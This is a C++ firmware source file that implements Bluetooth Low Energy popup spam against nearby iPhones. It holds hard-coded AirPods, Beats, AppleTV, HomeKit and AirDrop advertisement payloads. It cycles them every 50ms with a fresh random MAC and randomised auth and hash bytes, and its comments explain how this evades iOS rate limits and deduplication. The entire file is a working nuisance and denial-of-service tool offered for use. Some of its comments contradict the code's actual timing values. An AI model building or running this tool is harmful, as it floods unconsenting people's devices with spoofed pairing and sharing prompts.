/**
 * ble_spam.cpp — Apple iOS BLE Proximity Spam (Momentum-style)
 * -------------------------------------------------------------
 * Replicates the approach used by Flipper Zero Momentum firmware that
 * keeps working on iOS 17.2+ and iOS 18.
 *
 * The key differences from naive BLE spam:
 *
 * 1. CYCLE ALL PAYLOAD TYPES RAPIDLY — don't pick one randomly.
 *    iOS rate-limits per payload type but not across types.
 *    Cycling quickly through all types saturates iOS's cooldown window.
 *
 * 2. 20ms ADVERTISEMENT INTERVAL — minimum allowed by BLE spec.
 *    Flipper's CC2540 chip uses this. We match it via itvl_min=0x0010.
 *
 * 3. NEW RANDOM MAC EVERY SINGLE ADVERTISEMENT — iOS deduplicates
 *    by source MAC. Fresh MAC = fresh popup trigger every time.
 *
 * 4. RANDOMISE AUTH BYTES — the 3 auth bytes in Nearby Action are
 *    not validated by iOS for popup triggering. Randomising them
 *    prevents iOS from deduplicating on payload content.
 *
 * 5. PROXIMITY PAIRING (AirPods) — type 0x07. This is the most
 *    reliable popup on all iOS versions because AirPods pairing
 *    is a core UX feature Apple can't easily disable.
 *
 * Payload types (Apple Continuity Protocol):
 *   0x07 = Proximity Pairing (AirPods / Beats popups) ← most reliable
 *   0x10 = Nearby Action    (AppleTV, HomeKit, HomePod etc.)
 *   0x05 = AirDrop          (sharing popup)
 *   0x0F = Nearby Info      (general nearby device)
 *
 * Sources: WillyJL/Momentum-Firmware, ECTO-1A CVE-2023-42941 research,
 *          simondankelmann/Bluetooth-LE-Spam, EvilAppleJuice-ESP32
 */
#include "ble_spam.h"

// ── Proximity Pairing payloads (AirPods / Beats) ─────────────────────────────
// These trigger "Connect AirPods" / "Connect Beats" popups.
// Most reliable on iOS 17-18 because Apple cannot disable AirPods pairing UI.
// Format: [company_id 2B][type 0x07][len 0x13][status 2B][model 2B][color 1B][...]
static const uint8_t PROXIMITY_PAIRS[][25] = {
  // AirPods Pro 2
  {0x4C,0x00, 0x07,0x13, 0x01,0x02, 0x20,0x02, 0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  // AirPods 3rd gen
  {0x4C,0x00, 0x07,0x13, 0x01,0x02, 0x60,0x02, 0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  // AirPods Max
  {0x4C,0x00, 0x07,0x13, 0x01,0x02, 0x0A,0x20, 0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  // Beats Studio Pro
  {0x4C,0x00, 0x07,0x13, 0x01,0x02, 0x40,0x09, 0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  // Beats Fit Pro
  {0x4C,0x00, 0x07,0x13, 0x01,0x02, 0x60,0x09, 0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
static const int NUM_PROXIMITY = 5;

// ── Nearby Action payloads (AppleTV, HomeKit, HomePod) ────────────────────────
// Format: [company_id 2B][0x10][0x05][flags][action_type][3x auth bytes]
// Still triggers popups on iOS 18 with cooldown (cycle fast to saturate cooldown)
static const uint8_t ACTIONS[][9] = {
  {0x4C,0x00, 0x10,0x05, 0xC0,0x01, 0x00,0x00,0x00},  // AppleTV Setup
  {0x4C,0x00, 0x10,0x05, 0xC0,0x0D, 0x00,0x00,0x00},  // HomeKit Setup
  {0x4C,0x00, 0x10,0x05, 0xC0,0x0E, 0x00,0x00,0x00},  // HomePod Setup
  {0x4C,0x00, 0x10,0x05, 0x00,0x13, 0x00,0x00,0x00},  // AppleTV Color Balance
  {0x4C,0x00, 0x10,0x05, 0xC0,0x0B, 0x00,0x00,0x00},  // AppleTV Keyboard
  {0x4C,0x00, 0x10,0x05, 0xC0,0x20, 0x00,0x00,0x00},  // AppleTV New User
  {0x4C,0x00, 0x10,0x05, 0xC0,0x2B, 0x00,0x00,0x00},  // AppleTV User Added
  {0x4C,0x00, 0x10,0x05, 0xC0,0x27, 0x00,0x00,0x00},  // Transfer Nearby
};
static const int NUM_ACTIONS = 8;
static const char* ACTION_NAMES[] = {
  "AppleTV Setup","HomeKit Setup","HomePod Setup","AppleTV Color Bal",
  "AppleTV Keyboard","AppleTV New User","AppleTV User Added","Transfer Nearby"
};

// ── AirDrop payload ───────────────────────────────────────────────────────────
// Triggers "Someone is trying to share with you" on iOS
static const uint8_t AIRDROP_BASE[] = {
  0x4C,0x00, 0x05,0x12,
  0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
  0x00,0x01  // 0x01 = everyone can receive
};

// Total payload cycle:
// 5 Proximity Pairing + 8 Nearby Actions + 1 AirDrop = 14 different popups
// iOS 18 rate-limits each TYPE but cycles through all 14 before any one repeats
#define TOTAL_PAYLOADS (NUM_PROXIMITY + NUM_ACTIONS + 1)

void BLESpam::begin() { _running=false; _sent=0; _idx=0; }

bool BLESpam::start() {
  _idx=0; _sent=0; _lastTx=0; _running=true;
  Serial.printf("BLESpam: started — cycling %d payloads at 20ms intervals\n",
                TOTAL_PAYLOADS);
  return true;
}

void BLESpam::stop() {
  _running=false;
  ble_gap_adv_stop();
  Serial.printf("BLESpam: stopped after %d advertisements\n", _sent);
}

/**
 * _sendPayload() - Send one BLE advertisement with a fresh random MAC
 *
 * Steps:
 *  1. Stop any current advertisement
 *  2. Generate a new non-resolvable random MAC address
 *  3. Build the advertisement fields with our payload
 *  4. Start advertising with 20ms interval (minimum = most aggressive)
 */
static void _sendPayload(const uint8_t* data, uint8_t len) {
  ble_gap_adv_stop();
  delay(2); // give BLE stack 2ms to process stop before reconfiguring

  // Fresh random MAC prevents iOS from deduplicating this advertisement
  // Non-resolvable private address (type 1) = no IRK needed
  ble_addr_t rnd;
  ble_hs_id_gen_rnd(1, &rnd);
  ble_hs_id_set_rnd(rnd.val);

  // Build BLE advertisement fields
  struct ble_hs_adv_fields fields = {};
  fields.flags        = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
  fields.mfg_data     = (uint8_t*)data;
  fields.mfg_data_len = len;
  ble_gap_adv_set_fields(&fields);

  // 20ms advertising interval = minimum BLE spec allows
  // 0x0010 * 0.625ms = 10ms min, 0x0020 = 20ms
  // Flipper uses this same interval - it's the key to saturating iOS cooldowns
  struct ble_gap_adv_params params = {};
  params.conn_mode   = BLE_GAP_CONN_MODE_NON;  // non-connectable broadcast
  params.disc_mode   = BLE_GAP_DISC_MODE_GEN;  // general discoverable
  params.itvl_min    = 0x0020;  // 20ms minimum interval
  params.itvl_max    = 0x0030;  // 30ms maximum interval
  params.channel_map = BLE_GAP_ADV_DFLT_CHANNEL_MAP;  // all 3 BLE channels

  ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &params, NULL, NULL);
}

void BLESpam::tick() {
  if(!_running) return;

  // Send a new payload every 80ms
  // 80ms * 14 payloads = 1.12 seconds per full cycle
  // iOS 18 cooldown per type is ~2-3 seconds, so we hit each type
  // before the cooldown expires - this is exactly how Momentum works
  if(millis() - _lastTx < 50) return; // 50ms = faster cycling, hits iOS cooldown harder
  _lastTx = millis();

  int idx = _idx % TOTAL_PAYLOADS;

  if(idx < NUM_PROXIMITY) {
    // ── Proximity Pairing (AirPods/Beats) - most reliable on iOS 18 ──────────
    uint8_t buf[25];
    memcpy(buf, PROXIMITY_PAIRS[idx], 25);
    // Status byte (buf[4]): MUST stay 0x01 = "unpaired/discoverable mode"
    // If we randomise this iOS sees the device as already paired and ignores it
    // Battery byte (buf[5]): can randomise - encodes battery % which iOS displays
    buf[4] = 0x01;              // keep: device is in pairing mode
    buf[5] = random(0x10,0x70); // randomise battery level so each looks fresh
    // Model bytes (buf[6]-buf[7]): keep fixed - these determine popup text
    // Trailing 16 bytes: fully randomise - these are device-specific serial data
    // iOS uses these to deduplicate - different values = treated as new device
    for(int i=9; i<25; i++) buf[i] = random(256);
    _sendPayload(buf, 25);
    if(_sent % 14 == 0)
      Serial.printf("BLESpam: Proximity Pairing #%d [total %d]\n", idx, _sent);

  } else if(idx < NUM_PROXIMITY + NUM_ACTIONS) {
    // ── Nearby Action (AppleTV/HomeKit/HomePod) ───────────────────────────────
    int ai = idx - NUM_PROXIMITY;
    uint8_t buf[9];
    memcpy(buf, ACTIONS[ai], 9);
    // Randomise auth bytes (last 3 bytes) - iOS doesn't verify these for popups
    // but uses them for deduplication, so randomising = new popup each send
    buf[6] = random(256);
    buf[7] = random(256);
    buf[8] = random(256);
    _sendPayload(buf, 9);
    if(_sent % 14 == 0)
      Serial.printf("BLESpam: %s [total %d]\n", ACTION_NAMES[ai], _sent);

  } else {
    // ── AirDrop ───────────────────────────────────────────────────────────────
    uint8_t buf[sizeof(AIRDROP_BASE)];
    memcpy(buf, AIRDROP_BASE, sizeof(AIRDROP_BASE));
    // Randomise the hash bytes (bytes 4-19) - these are normally SHA256 hashes
    // of the user's Apple ID, but iOS shows the popup regardless of their value
    for(int i=4; i<20; i++) buf[i] = random(256);
    _sendPayload(buf, sizeof(buf));
  }

  _sent++;
  _idx = (_idx + 1) % TOTAL_PAYLOADS; // advance to next payload type
}
